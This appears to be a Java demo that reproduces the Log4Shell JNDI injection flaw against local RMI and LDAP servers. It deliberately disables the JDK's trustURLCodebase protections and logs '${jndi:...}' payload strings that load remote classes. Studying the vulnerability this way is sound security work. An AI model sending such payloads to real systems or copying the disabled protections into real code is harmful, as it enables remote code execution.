package org.mazhuang;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author mazhuang
 * @date 2021/12/11
 */
public class Main {

    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        // ref https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
        // Starting with Java 8u121 requires the following two lines
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        String username = "${jndi:rmi://127.0.0.1:1099/exploit}";
        logger.info("Hello, {}", username);

        String username2 = "${jndi:ldap://127.0.0.1:1389/org.mazhuang.ldap.Exploit}";
        logger.info("Hello, {}", username2);
    }
}
